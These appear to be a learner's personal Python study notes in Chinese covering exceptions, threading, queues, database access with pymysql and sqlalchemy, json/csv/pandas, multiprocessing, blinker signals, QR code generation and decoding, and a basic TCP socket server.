都是实际上b与c没有关系，只是a(b,c)的关系时是这样而已。super(class,self).方法，class是子类，super()class的父类，self要是对应子类的实例，方法是父类
的方法。子类肯定可以用父类的属性和方法，子类实例化时父类初始化中有子类的属性和方法，也是允许交互调用的。实例化和初始化应该分开来看，可以使用
属性和方法不代表实例化了。子类可以实例化父类或者父类可以实例化子类，不知道，学长说子类可以实例化父类，父类不可以实例化子类。
65：vscode 下载插件Prettier后再左下角设置里查询save，更改format  on save 设置保存文件时自动格式化代码。
66：python异常类：所有异常都在基类exception里，都在exceptions模块中，系统会进行回溯(traceback)来终止执行，返回信息包括错误原因，行数，错误
名称。捕获异常格式：try:   except:   except:后面接的就是异常类，发生的异常和接的异常类对上号的时候就执行，没对上号的时候就不执行，如果接的是
Exception,代表的是基类，把所有异常类包括在里面了，什么都不接和接excption是一样的。可以有多个except:来捕获异常，一个except也可以捕获多个异常，
(,,,)。except: 后可以接else:也可以接finally:前面那个是没有发生异常就会执行的代码，后面的是无论有没有异常都会执行的代码。try代码也可以放在函数内部。
当Python脚本发生异常时我们需要捕获处理它，否则程序会终止执行。异常是Python对象，表示一个错误，可以在as a:print(a.)中寻找异常的属性。
使用raise语句自己触发异常，
raise：单独一个 raise。该语句引发当前上下文中捕获的异常（比如在 except 块中），或默认引发 RuntimeError 异常。
raise 异常类名称：raise 后带一个异常类名称，表示引发执行类型的异常。
raise 异常类名称(描述信息)：在引发指定类型的异常的同时，附带异常的描述信息。
由于在其之前我们已经手动引发了 ValueError 异常，因此这里当再使用 raise 语句时，它会再次引发一次。raise ValueError("a 必须是数字")
可以自定义一个class异常，然后一个__init__初始化加一个参数，另一个函数return这个参数。raise引发异常感觉包括了创建实例的过程，
后面是传入实参，捕获异常后打印实参。
自动捕获的异常会提供异常参数，可以在except中的异常后面，使用，打印出来。
67：1、单CPU中进程只能是并发，多CPU计算机中进程可以并行。
2、单CPU单核中线程只能并发，单CPU多核中线程可以并行。
3、无论是并发还是并行，使用者来看，看到的是多进程，多线程。
主线程的重要性体现在两方面：1.是产生其他子线程的线程；2.通常它必须最后完成执行比如执行各种关闭动作。
但是只是通常而已。子线程调用join()函数能让主线程等待这个子线程，这个函数还可以传入参数，比如4，表示让主线程等待这个子线程4秒。
加0与不加一样。表示等待子线程运行完毕再执行函数后面的代码，就是让主线程等待在那个地方，线程锁设置为一个的时候，
锁内的代码先执行完，后面的代码才会再次执行，可以锁住某个列表之类的数据。
Python中使用线程有两种方式：函数或者用类来包装线程对象。函数线程创建：导入threading模块，Thread创建
类线程创建：导入threading模块，使用threading模块创建线程，直接从threading.Thread继承，然后重写__init__方法和run方法：
线程的结束一般依靠线程函数的自然结束；也可以在线程函数中调用thread.exit()，
他抛出SystemExit exception，达到退出线程的目的。
Python通过两个标准库thread和threading提供对线程的支持。
threading 模块提供的其他方法：
threading.currentThread(): 返回当前的线程变量。
threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。
threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。
除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法:
run(): 用以表示线程活动的方法。
start():启动线程活动。
join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。
isAlive(): 返回线程是否活动的。
getName(): 返回线程名。
setName(): 设置线程名。
thread提供了低级别的、原始的线程以及一个简单的锁。
threadLock = threading.Lock()设置锁，threadLock.acquire()获得锁，threadLock.release()释放锁。
队列会通过先进先出或者先进后出的模式，保证了单个数据不会进行同时被多个线程进行访问。FIFO即First in First Out,先进先出。Queue提供了一个
基本的FIFO容器，LIFO即Last in First Out,后进先出。与栈的类似，使用也很简单。
Queue.Queue(maxsize=0) #FIFO， 用来定义队列的长度，如果maxsize小于1就表示队列长度无限,
Queue.LifoQueue(maxsize=0) #LIFO， 如果maxsize小于1就表示队列长度无限。
workQueue = Queue.Queue(10)
Queue.qsize() 返回队列的大小
Queue.empty() 如果队列为空，返回True,反之False
Queue.full() 如果队列满了，返回True,反之False
Queue.full 与 maxsize 大小对应
Queue.get([block[, timeout]])获取队列，timeout等待时间
Queue.get_nowait() 相当Queue.get(False)
Queue.put(item) 写入队列，timeout等待时间
Queue.put_nowait(item) 相当Queue.put(item, False)
Queue.task_done() 在完成一项工作之后，Queue.task_done()函数向任务已经完成的队列发送一个信号
Queue.join() 实际上意味着等到队列为空，再执行别的操作
68：Python 标准数据库接口为 Python DB-API，Python DB-API为开发人员提供了数据库应用编程接口。
不同的数据库你需要下载不同的DB API模块，例如你需要访问Oracle数据库和Mysql数据，你需要下载Oracle和MySQL数据库模块。
DB-API 是一个规范. 它定义了一系列必须的对象和数据库存取方式, 以便为各种各样的底层数据库系统和多种多样的数据库接口程序提供一致的访问接口 。
Python的DB-API，为大多数的数据库实现了接口，使用它连接各数据库后，就可以用相同的方式操作各数据库。
Python DB-API使用流程：
引入 API 模块。
获取与数据库的连接。
执行SQL语句和存储过程。
关闭数据库连接。


'''
69：python与json：python内置json包
encoding='utf8'
json.load函数
1：import json;
2:with open('xxx.json','r') as file:
3:js0=json.load(file);	此时为一个字典

json.loads函数
js=一个json字符串
js0=json.loads(js);		此时为一个字典

json.dumps函数		可把dict，list，tuple，string，int，float，True，False，None等变为json字符串
js=一个json字典
js0=json.dumps(js);		此时变成一个json的string字符串{"name": "u4f60u731c", "age": 19, "city": "u56dbu5ddd"}，但是其实不是字符串

json.dump函数
js=一个json格式字典
with open('output.json','w')as f:
	json.dump(js,f)	转变为json并存入文件

70：CSV介绍
1.CSV介绍
CSV全称是Comma Separate Values，这种文件格式可以作为不同程序之间的数据交互的格式。
.csv就是一种纯文本文件（如.txt、.doc等)。即是一组字符序列，字符之间已英文字符的逗号或制表符（Tab）分隔。
语法比较简单:
1.1.每条记录占一行 以逗号为分隔符
1.2.逗号前后的空格会被忽略
1.3.字段中包含有逗号,换行符,空格,双引号等，该字段必须用双引号括起来
1.4.字段中的双引号用两个双引号表示
1.5.第一条记录，可以是字段名
2.CSV创建,读取
在windows系统环境上.csv文件打开方式有多种，如记事本、excel、Notepad++等，只要是文本编辑器都能正确打开。
可以使用excel编辑内容,在保存时名字后缀名写成.csv,格式选择windows-comma-separated(.csv),默认是以;为分割.可以手动改成,号
可以使用记事本编辑内容,在保存时名字后缀名写成.csv,格式选择所有文件(*.*)
XML/CSV/json都是用于数据交互的文件格式。

python操作CSV文件：
读取
import csv
with open('123.csv', 'r', encoding='UTF-8')as f:
i = csv.reader(f)		此时为<_csv.reader object at 0x000001C53FB78A00>
a = list(i)		转换为列表格式，一行一个列表。
或者直接用循环print出来也可以
for a in i:
        print(a)
写入
或者(with open('社会信用代码.csv','a', encoding="utf-8", newline="")as file:)
import csv
with open('456.csv', 'w', newline='')as fi:
    i = csv.writer(fi)
    i.writerow(['名字', '民族', '性别'])
    i.writerow(['和东方', '含', '男'])

用于数据分析的库：pandas
先在cmd里：pip install pandas
后在VScode里ctrl+shift+p选择python解释器，然后选择我们安装了pandas的解释器。就可以使用pandas了
import pandas as pd
i=pd.read_csv('123.csv')
print(i)
格式和直接打开的有点不一样。head()函数可读取前五条数据
写入
i=csv格式数据
i.to_csv('123.csv', encoding='gbk')写入格式与之前的写入略微不同，可通过用i.to_csv('789.csv', index=False, encoding='gbk')调整
pandas读取excel数据：i=pd.read_excel('***.xls',sheet_name='123')	出错误，未解决。

pandas读取json
DataFrame 一个表格型的数据结构，既有行标签（index），又有列标签（columns），它也被称异构数据表，所谓异构，指的是表格中每列的数据类型可以不同，比如可以是字符串、整型或者浮点型等。
Series 结构是一种类似于一维数组的结构，由一组数据值（value）和一组标签组成
data=pd.DataFrame( data, index, columns, dtype, copy)最后两个参数一般默认即可，data可以是 ndarray，series，list，dict，标量以及一个 DataFrame。
index行标签，如果没有传递 index 值，则默认行标签是 np.arange(n)，n 代表 data 的元素个数。columns	列标签，如果没有传递 columns 值，则默认列标签是 np.arange(n)。dtype	表示每一列的数据类型。
data=pd.Series( data, index, dtype, copy)	后两个参数一般默认即可，index数据值索引默认从零开始，也可以指定使用类型。
data可以是数组，字典，标量等，index也可以是字符型或者数字。访问方式和访问数组一样，可用隐式索引访问(即默认索引方式)，也可用指定后的索引访问。
data.to_json()	转化为json字符串,to_json函数一般用来转换DataFrame或者Series为JSON格式。
data.to_json('**.json')保存为json文件，还有一个参数为orient，为DataFrame时默认取值为columns，为Series时默认索引为index，作用是生成不同表现形式的json.
data=pd.read_json(json字符串)	把json字符串转化为json格式字典

pandas读取MySQL数据：
先安装pip install pymsql
import pymysql as pl
link=pl.connect(host='127.0.0.1',port=3306,user='root',passwd='123456',db='text',charset='utf8')
sql='select * from text'
res=pd.read_sql(sql,con=link)		即得到返回的语句

pymysql操作数据库：
import pymysql as pl
link = pl.connect(host='127.0.0.1', user='root',
                  passwd='995940822', port=3306, db='test', charset='utf8')
cursor=link.cursor()
sql = 'select * from test1'
cursor.execute(sql)
res=cursor.fetchall()
print(res)
cursor.close()
link.close()
其中：使用Cursor类，通过 .cursor() 创建 cursor 游标对象，类方法execute()执行SQL语句，成功则返回结果。游标功能作用，我们可以将得到的结果先保存起来，然后可以随意进行自己的编程，得到我们最终想要的结果集，而不是一次性的打印到频幕上。
response1 = cursor.execute(sql)
response2 = cursor.fetchall()
response1是对cursor.execute(sql) 的返回数据接收，这个返回可能并不是你想要的返回值，因为它返回的是查询到的个数，是个int类型的数字
response2是调用了fetchall方法：查询时获取结果集中的所有行，一行构成一个元组，然后再将这些元组返回（即嵌套元组）
结果集获取方式：
cursor.fetchone()	获取结果集的下一行
cursor.fetchmany(size=None)	size指定返回的行数,None则返回空元组
cursor.fetchall()	返回剩下的所有行,如果走到末尾,就返回空元组,否则返回一个元组,其元素是每一行的记录封装的一个元组
cursor.rownumber	返回当前行号.可以修改,支持负数
cursor.rowcount	返回被提交语句所影响的行数
Connection类提供了三个方法： begin 开始事务， commit 提交事务， rollback 回滚事务,.使用rollback可以避免commit提交事务的时候发生错误导致程序中断
try:
 	
 	db.commit()
except Exception as e:
 	db.rollback()
获取实时数据的方法:
执行完任何数据库语句后，db.commit()
在封装MySQL类时，数据库connect连接一次就好了，游标可以创建释放多次，但是数据库连接释放多次不行。

sqlalchemy模块：

1.1：只执行原生sql语句：
from sqlalchemy import create_engine
engine = create_engine(
    "mysql+pymysql://root:995940822@localhost:3306/test", echo=True)	test?charset=utf8定义字符集打开方式
cursor = engine.connect()	//可用with engine.connect() as cursor:代替	session需要close(),session.close() 会将连接返回给Engine的连接池，并且不会关闭连接。engine.dispose() 将关闭连接池的所有连接.
res = cursor.execute('select * from test1;').fetchall()
print(res)
cursor.begin().commit()	.begin()提供了提交和回滚方法
cursor.close()
engine.dispose()

1.2
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
engine = create_engine(
    "mysql+pymysql://root:995940822@localhost:3306/test", echo=True)
Session = sessionmaker(bind=engine)
session = Session()
res = session.execute('select * from test1;').fetchall()	session提供提交回滚函数，session.rollback()
print(res)
engine.dispose()

2使用ORM来封装数据库
具体代码看文件D:\python\python文件\工作区1\封装数据库类——sqlalchemy.txt

71：多进程多线程：
进程可以简单的理解为一个可以独立运行的程序单位，它是线程的集合，进程就是有一个或多个线程构成的。而线程是进程中的实际运行单位，是操作系统进行运算调度的最小单位。可理解为线程是进程中的一个最小运行单元。
me:进程是资源空间，线程是任务执行/资源消耗，不同进程资源/空间不同。每个进程都有自己独立的地址空间(内存空间)
单进程单线程：一个人在一个桌子上吃菜。		me:一个任务消耗一个资源
单进程多线程：多个人在同一个桌子上一起吃菜。	me:多个任务消耗一个资源
多进程单线程：多个人每个人在自己的桌子上吃菜。	me:多个任务消耗多个资源
多进程优点：
1、每个进程互相独立，不影响主程序的稳定性，子进程崩溃没关系；
2、通过增加CPU，就可以容易扩充性能；
3、可以尽量减少线程加锁/解锁的影响，极大提高性能，就算是线程运行的模块算法效率低也没关系；
4、每个子进程都有2GB地址空间和相关资源，总体能够达到的性能上限非常大。
 多进程缺点：
1、逻辑控制复杂，需要和主程序交互；
2、需要跨进程边界，如果有大数据量传送，就不太好，适合小数据量传送、密集运算 多进程调度开销比较大；
3、最好是多进程和多线程结合，即根据实际的需要，每个CPU开启一个子进程，这个子进程开启多线程可以为若干同类型的数据进行处理。当然你也可以利用多线程+多CPU+轮询方式来解决问题……
为什么要使用多线程？
在一个程序中，有很多的操作是非常耗时的，如数据库读写操作，IO操作等，如果使用单线程，那么程序就必须等待这些操作执行完成之后才能执行其他操作。使用多线程，可以在将耗时任务放在后台继续执行的同时，同时执行其他操作。
可以提高程序的效率。
在一些等待的任务上，如用户输入，文件读取等，多线程就非常有用了。
多线程的缺点：
使用太多线程，是很耗系统资源，因为线程需要开辟内存。更多线程需要更多内存。
影响系统性能，因为操作系统需要在线程之间来回切换。
需要考虑线程操作对程序的影响，如线程挂起，中止等操作对程序的影响。
线程使用不当会发生很多问题。
对于 Windows 系统来说，创建进程的时间开销很大，因此 Windows 多线程学习重点是要大量面对资源争抢与同步方面的问题。
对于 Linux 系统来说，创建进程的时间开销很小，因此，Linux 下的学习重点大家要学习进程间通讯的方法。

进程分类：
Linux：
1. 交互进程：是由shell启动的进程，它既可以在前台运行，也可以在后台运行。交互进程在执行过程中，要求与用户进行交互操作。简单来说就是用户需要给出某些参数或者信息，进程才能继续执行。
2.批处理进程：与windows原来的批处理很类似，是一个进程序列。该进程负责按照顺序启动其它进程。
3.守护进程：是是执行特定功能或者执行系统相关任务的后台进程。守护进程只是一个特殊的进程，不是内核的组成部分。许多守护进程在系统启动时启动，直到系统关闭时才停止运行。而某些守护进程只是在需要时才会启动，比如FTP或者Apache服务等，可以在需要的时候才启动该服务。
另外，根据进程状态的不同，又可以把进程分为另外三类：守护进程、孤儿进程和僵尸进程。
1.守护进程：(补充):所有守护进程都可以超级用户(用户ID为0)的优先权运行；守护进程没有控制终端；守护进程的父进程都是init进程(即1号进程)。
    但是，并非所有在后台运行的进程都是守护进程，因为我们可以使用符号“&”来使进程在后台运行。比如：./bin/process_test   &，执行该条命令后，相应的进程在后台运行。
2.孤儿进程：一个父进程退出后，它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。孤儿进程将被init进程所收养，并由init进程对它们完成状态收集工作。
3.僵尸进程：产生僵尸进程的原因：子进程先于父进程退出，但父进程未关注到子进程的退出，因此系统不会完全释放子进程的资源，这个子进程进入僵尸状态。当僵尸进程的父进程结束后该僵尸进程就会被init进程所收养，最终被回收。
僵尸进程会导致资源的浪费，而孤儿进程不会。
线程分类：
用户线程（ULT），由我们APP等应用来创建，调度，管理，操作系统不用管理的线程。
内核线程（KLT），由我们系统内核来创建调度，管理的线程。
主线程：程序启动时，操作系统会创建一个进程，与此同时会立即运行一个线程，该线程通常被称为主线程。主线程的作用主要有两个，一个是产生其他子线程，另一个是最后执行各种关闭操作，例如文件的关闭。
子线程：程序中创建的其它线程。
守护线程（后台线程）：守护线程是在后台为其它线程提供服务的线程，它独立于程序，不会因程序的终止而结束。当进程中只剩下守护线程时，进程直接退出。
前台线程：相对于守护线程的其它线程称为前台线程。
线程与进程相似，也具有五个状态，分别是新建态、就绪态、运行态、阻塞态和消亡态，这些状态之间的转换如图1所示。


进程创建：
window系统下，需要注意的是要想启动一个子进程，必须加上那句if __name__ == "__main__"，进程相关的要写在这句下面。
方式1：函数进程
from multiprocessing import Process
process1=Process(target=func,args=(,))	target参数为进程内容，一般是函数，args参数是进程函数的参数，用元组传递，多出一个,
process1.start()	进程就绪，start()方法会自动调用run()方法，一般fun方法会执行进程函数
process1.join()	进程间同步，例如：A进程中调用B.join(),那么谁先到达这个时间点都会被阻塞，直到另一个进程到达为止。
补充：
和使用 thread 类创建子线程的方式非常类似，使用 Process 类创建实例化对象，其本质是调用该类的构造方法创建新进程。Process 类的构造方法格式如下：
def __init__(self,group=None,target=None,name=None,args=(),kwargs={})

其中，各个参数的含义为：
group：该参数未进行实现，不需要传参；
target：为新建进程指定执行任务，也就是指定一个函数；
name：为新建进程设置名称；
args：为 target 参数指定的参数传递非关键字参数；
kwargs：为 target 参数指定的参数传递关键字参数。
daemon	和守护线程类似，通过设置该属性为 True，可将新建进程设置为“守护进程”。
方式2：创建类的形式
from multiprocessing import Process
class student(Process):
    def __init__(self, name):
        super().__init__()
        self.name = name

    def run(self):
        print(func(4, 5))
        print(self.name, "是一名学生")

def func(a, b):
    return a*b

if __name__ == '__main__':
    student1 = student("王五")
    student1.start()
    print(student1.is_alive())
    student1.join()
类的实例可以执行的方法：
        is_alive()：返回进程是否在运行,bool类型。
　　join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的timeout（可选参数）。也就是通过传给join一个参数来设置超时，也就是超过指定时间join就不在阻塞进程。而在实际应用测试的时候发现并不是所有的线程在超时时间内都结束的，而是顺序执行检验是否在time_out时间内超时。
　　start()：进程准备就绪，等待CPU调度
　　run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。
　　terminate()：不管任务是否完成，立即停止工作进程
拥有的其它属性(不止)：
name属性	可以为该进程重命名，也可以获得该进程的名称。
daemon	和守护线程类似，通过设置该属性为 True，可将新建进程设置为“守护进程”。
pid	返回进程的 ID 号。大多数操作系统都会为每个进程配备唯一的 ID 号。
线程创建
法一：函数线程，和函数进程差不多，原理也差不多一样。
import threading as tg

def get_name(name, Class):
    print(name, "是属于", Class, '班的')

thread1 = tg.Thread(target=get_name, args=('李四', '5',))	用threading的Thread创建
thread1.start()
thread1.join()
补充：
Thread 类提供了如下的 __init__() 构造器，可以用来创建线程：
__init__(self, group=None, target=None, name=None, args=(), kwargs=None, *,daemon=None)
此构造方法中，以上所有参数都是可选参数，即可以使用，也可以忽略。其中各个参数的含义如下：
group：指定所创建的线程隶属于哪个线程组（此参数尚未实现，无需调用）；
target：指定所创建的线程要调度的目标方法（最常用）；
args：以元组的方式，为 target 指定的方法传递参数；
kwargs：以字典的方式，为 target 指定的方法传递参数；
daemon：指定所创建的线程是否为守护线程。
法二：类线程
import threading as tg

class Student(tg.Thread):
    def __init__(self, name):
        super().__init__()
        self.name = name

    def run(self):
        get_name(self.name, 1)

def get_name(name, Class):
    print(name, "是属于", Class, '班的')

thread1 = Student('张六')
thread1.start()
thread1.join()
补充内容和函数线程一样。
管道创建使用:进程间通信
匿名管道：作用范围是父子进程和兄弟进程
python内置multiprocessing,没有multiprocess，从multiprocessing中import出Pipe与Process模块。

import os
import time
from multiprocessing import Pipe, Process  # 进程间通信

def func(name, a):
    time.sleep(1)
    a.send('管道发送人'+str(name))
    print('父进程的id为:', os.getppid(), "--------", '子进程的id为:', os.getpid())

if __name__ == '__main__':
    # Pipe函数创建一个管道，参数只有一个，duplex默认值为True,表示管道为双向管道（全双工）如果设置为False则为单项管道（半双工）
    # 返回两个管道流对象，两个管道流对象分别表示管道的两端，如果参数为True的时候，两个对象均可发送接收，
    # 如果为False时，则第一个对象只能接收，第二个就只能发送
    left, right = Pipe(duplex=False)
    job = []
    for i in range(5):
        p = Process(target=func, args=(i, right))
        job.append(p)
        p.start()  # 作用和进程的start()一样，
    for i in range(5):
        data = left.recv()  # send()是管道的发送方法，recv（）是管道的接收方法
        print(data)
    for i in job:
        i.join()  # 和进程的join()一样

# 补充：1：管道实质：在内存中开辟一个新的空间，对多个进程可见，在通信形式上形成一种约束
# 2：recv()函数为阻塞函数，当管道中数据为空的时候会阻塞
# 3.一次recv()只能接收一次send()的内容
# 4.send可以发送的数据类型比较多样，字符串，数字，列表等等

锁创建与使用：线程间的约束
1：互斥锁：
import threading
lock = threading.Lock()  # 创建锁
lock.acquire()  # 获取锁
lock.release()  # 释放锁
with lock:  # 自动获取和释放锁
    pass
2：重用锁
import threading
# 在之前的代码中永远不可能出现锁在没释放之前重新获得锁，但rlock可以做到，但只能发生在一个线程中，如：
num = 0

def a(lock):
    with lock:
        print("我是A")
        b(lock)

def b(lock):
    with lock:
        print("我是b")

if __name__ == '__main__':
    lock = threading.RLock()
    t1 = threading.Thread(target=a, args=(lock,))
    t1.start()  # Lock()会发生死锁，因为在第一次还没释放锁后，b就准备上锁，并阻止a释放锁

3：同步锁：对复杂线程同步问题的支持
还没了解


信号量：进程与线程都可以使用
初步了解，可以控制并发量


事务：进程间使用
import multiprocessing
import time
from multiprocessing import Process

event = multiprocessing.Event()  # 事件创建后默认为False

def xiao_fan(event):
    print('小贩：生产...')
    print('小贩：售卖...')
    print('小贩：等待就餐')
    event.set()
    event.clear()
    event.wait()
    print('小贩：谢谢光临')
    event.set()
    event.clear()

def gu_ke(event):
    print('顾客：准备买早餐')
    event.set()  # 因为是顾客进程先执行的，所以顾客进程先设置事件为True，然后再设置为False,然后等待在wait，后执行的小贩进程
    # 会在这个时候set事件为true，然后顾客进程通过wait()，打印剩下字句，同时小贩进程clear函数设置事务为False，
    # 卡在wait()函数，然后顾客进程再次set()，小贩打印剩下字句，后面的变动就没有多大意义了
    event.clear()
    event.wait()
    print('顾客：买到早餐')
    print('顾客：享受美食')
    print('顾客：付款，真好吃...')
    event.set()
    event.clear()

if __name__ == '__main__':
    xf = multiprocessing.Process(target=xiao_fan, args=(event,))
    gk = multiprocessing.Process(target=gu_ke, args=(event, ))
    gk.start()
    xf.start()
# 补充：
# 1：机制：全局定义了一个“Flag”，如果“Flag”值为 False，那么当程序执行 event.wait 方法时就会阻塞，如果“Flag”值为True，
# 那么event.wait 方法时便不再阻塞。
# 2：set(): 将标志设为True，并通知所有处于等待阻塞状态的线程恢复运行状态。
# clear(): 将标志设为False。
# wait(timeout): 如果标志为True将立即返回，否则阻塞线程至等待阻塞状态，等待其他线程调用set()。
# is_set(): 获取内置标志状态，返回True或False。

信号：进程间通信
blanker的signal：
引入blanker的signal模块之后：
匿名信号：
blinker也支持匿名信号，就是不需要指定一个具体的信号值。创建的每一个匿名信号都是互相独立的。
s = Signal()		是大写的S
s.connect(animal)
s.send()			只接收与传递一个参数，对应的函数也是必须一个参数
命名信号：
ready = signal('ready') 创建名为ready的事件中心，命名随意
ready.connect(subscriber1) 给ready事件中心添加事件监听器，参数为函数名
ready.send("go") 向ready事件中心派发事件，这样事件监听器会收到事件并进行处理/send是一个回调函数。
组播信号：
多个接收者注册到信号上，发送者只需要发送一次就能传递信息到多个接收者
s = signal('king')
s.connect(animal_one)
s.connect(animal_two)
s.send('大王叫我来巡山，抓个和尚做晚餐！')
接收方订阅主题：相当于接受特定信息
只有当指定的主题发送消息时才发送给接收方。
s = signal('king')
s.connect(animal, sender='大象')	sender也是只接受一个参数
for i in ['狮子', '大象', '大鹏']:
        s.send(i)			当send特定信号时，接收器会接收
装饰器用法：
s = signal('king')
@s.connect
def animal_one(args):
    print(f'我是小钻风，今天的口号是: {args}')
s.send('大王叫我来巡山，抓个和尚做晚餐！')
订阅主题的装饰器
s = signal('king')
@s.connect_via('大象')
def animal(args):
    print(f'我是小钻风，{args} 是我大哥')
  for i in ['狮子', '大象', '大鹏']:
        s.send(i)
查看信号接收者
 res = s.receivers
    print(res)
查看函数是否订阅了信号的主题
res = s.has_receivers_for(animal)
    print(res)

signal模块：需要运行在Linux下

死锁及其解决办法一：

72：
二维码创建之qrcode：
步骤：
创建QRCode对象
add_data()添加数据
make_image()创建二维码（返回im类型的图片对象）
自动打开图片，im.show()

import qrcode

qr = qrcode.QRCode(
    version=None
    error_correction=qrcode.constants.ERROR_CORRECT_H,
    box_size=10,
    border=4,
)

qr.add_data('192.168.233.128:3333:AF_INET')

qr.make(fit=True)
img = qr.make_image()
filename = 'socket.png'
img.save(filename)
img.show()
基本的微信二维码：
import qrcode
from PIL import Image
import matplotlib.pyplot as plt


def getQRcode(data, file_name):
    qr = qrcode.QRCode(
        version=5,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=5,
        border=4,
    )

    # 添加数据
    qr.add_data(data)
    # 填充数据
    qr.make(fit=True)
    # 生成图片
    img = qr.make_image(fill_color="green", back_color="white")

    # 添加logo，打开logo照片
    icon = Image.open("1.png")
    # 获取图片的宽高
    img_w, img_h = img.size
    # 参数设置logo的大小
    factor = 6
    size_w = int(img_w / factor)
    size_h = int(img_h / factor)
    icon_w, icon_h = icon.size
    if icon_w > size_w:
        icon_w = size_w
    if icon_h > size_h:
        icon_h = size_h
    # 重新设置logo的尺寸
    icon = icon.resize((icon_w, icon_h), Image.ANTIALIAS)
    # 得到画图的x，y坐标，居中显示
    w = int((img_w - icon_w) / 2)
    h = int((img_h - icon_h) / 2)
    # 黏贴logo照
    img.paste(icon, (w, h), mask=None)
    # 终端显示图片
    plt.imshow(img)
    plt.show()
    # 保存img
    # img.save(file_name)
    return img


if __name__ == '__main__':
    getQRcode("世情薄，人情恶，雨送黄昏花易落。晓风干，泪痕残，欲笺心事，独语斜阑。"
              "难，难，难！人成各，今非昨，病魂常似秋千索。角声寒，夜阑珊，怕人寻问，咽泪装欢。瞒，瞒，瞒！", 'my.png')

生成动态背景/艺术背景的二维码(动态二维码的图片格式也是.gif)：
from MyQR import myqr
import os
version, level, qr_name = myqr.run( words='http://smilecoc.vip/', version=1, level='H', picture=None, colorized=False, contrast=1.0, brightness=1.0, save_name=None, save_dir=os.getcwd() )

参数：
version 控制边长，范围是1至40，数字越大边长越大；
level 控制纠错水平，范围是L、M、Q、H，从左到右依次升高。 
picture 用来将QR二维码图像与一张同目录下的图片相结合，产生一张带底图的二维码，支持 .jpg， .png ，.bmp ，.gif 格式图片。
colorized 可以使产生的图片由黑白变为彩色的。
contrast 用以调节图片的对比度，1.0 表示原始图片，更小的值表示更低对比度，更大反之。默认为1.0。
brightness 用来调节图片的亮度，其余用法和取值与 contrast 相同。
save_name 控制文件名，格式可以是 .jpg， .png ，.bmp ，.gif ；
save_dir 控制位置。
生成的动态二维码的version越大，支持的动态图片也就越大，效果越好。

二维码解码：
import cv2
import qrcode
'''
img = qrcode.make('192.168.233.128:3333:AF_INET')

with open('socket.png', 'wb') as f:
    img.save(f)
'''
d = cv2.QRCodeDetector()
val, _, _ = d.detectAndDecode(cv2.imread('socket.png'))  
ip, port, type = val.split(':', 2)
print(ip, port, type)

解码二：
from PIL import Image
import pyzbar.pyzbar as pyzbar

img_path = 'myqr1.png'
img = Image.open(img_path)

#使用pyzbar解析二维码图片内容
barcodes = pyzbar.decode(img)

#打印解析结果，从结果上可以看出，data是识别到的二维码内容，rect是二维码所在的位置
print(barcodes)
# [Decoded(data=b'http://www.h3blog.com', type='QRCODE', rect=Rect(left=7, top=7, width=244, height=244), polygon=[Point(x=7, y=7), Point(x=7, y=251), Point(x=251, y=251), Point(x=251, y=7)])]

for barcode in barcodes:
    barcode_content = barcode.data.decode('utf-8') # 二维码内容
    print(barcode_content)
    barcode_rect = barcode.rect # 二维码在图片中的位置
    qr_size = list(barcode_rect) #二维码大小
    print(qr_size)

扫描个人微信二维码的话，微信个人名片二维码是支持解码的，你这个二维码无法解码的原因是因为，前景色比后景色浅，解码器无法识别。可以更换一个颜色，就是前面颜色码颜色比后面背景深的就可以。但是因为微信本身有限制，个人名片二维码解码后获取的链接，无法直接访问。

导出数据库聊天记录：
from sqlalchemy import create_engine
import csv
engine = create_engine(
    "mysql+pymysql://root:@localhost:3307/test", echo=True)	
cursor = engine.connect()	
res = cursor.execute('select * from talk_history;').fetchall()
with open('down_history.csv', 'w',newline='')as fi:
    i = csv.writer(fi)
    for l in res:
        i.writerow(l)
cursor.close()
engine.dispose()

代码实现socket编程：
Windows下：
服务器端：
from socket import *
import threading
from multiprocessing import *
ip = '127.0.0.1'  # 可以是0.0.0.0，为0.0.0.0的地址,这个地址事实上表示不确定地址,或“所有地址”、“任意地址”。服务器IP设置必须为0.0.0.0不然其他主机连不#上。
# 因为有些机子不止一块网卡，多网卡的情况下，这个就表示所有网卡ip地址的意思.
# INADDR_ANY就是指定地址为0.0.0.0的地址,客户端connect时，不能使用INADDR_ANY选项。必须指明要连接哪个服务器IP
port = 3333
try:
    listens = socket(AF_INET, SOCK_STREAM)  # 创建socket，AF_INET指使用IPv4地址
    '''   
int socket(int domain, int type, int protocol)
domain
参数表示套接字要使用的协议簇，协议簇的在“linux/socket.h”里有详细定义，常用的协议簇：
AF_UNIX（本机通信）
AF_INET（TCP/IP – IPv4）
AF_INET6（TCP/IP – IPv6）

type
“type”参数指的是套接字类型，常用的类型有：
SOCK_STREAM（TCP流）
SOCK_DGRAM（UDP数据报）
SOCK_RAW（原始套接字）

protocol
协议“protocol”一般设置为“0”，就是说在已经确定套接字使用的协议簇和类型时，这个参数的值就为0。
但是有时候创建初始套接字时，在domain参数未知情况下，即不清楚协议簇和类型时，protocol参数可以用来确定协议的种类。

返回值
当套接字创建成功时，返回套接字，失败返回“-1”，错误代码则写入“errno”中。
'''
    listens.bind((ip, port))  # 绑定IP地址和端口
    '''
    int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
    (1）参数 sockfd ，需要绑定的socket。
    （2）参数 addr ，存放了服务端用于通信的地址和端口。
    （3）参数 addrlen ，表示 addr 结构体的大小
    （4）返回值：成功则返回0 ，失败返回-1，错误原因存于 errno 中。如果绑定的地址错误，或者端口已被占用，bind 函数一定会报错，否则一般不会返回错误。

    '''
    listens.listen(5)
    # listen函数的第一个参数即为要监听的socket描述字，第二个参数为相应socket可以排队的最大连接个数。
    # socket()函数创建的socket默认是一个主动类型的，listen函数将socket变为被动类型的，等待客户的连接请求。

except:
    print("服务器启动失败")
else:
    print('服务器启动成功,等待连接')
    datas, addr = listens.accept()
    print('欢迎客户端：', addr)
# TCP服务器端依次调用socket()、bind()、listen()之后，就会监听指定的socket地址了。TCP客户端依次调用socket()、
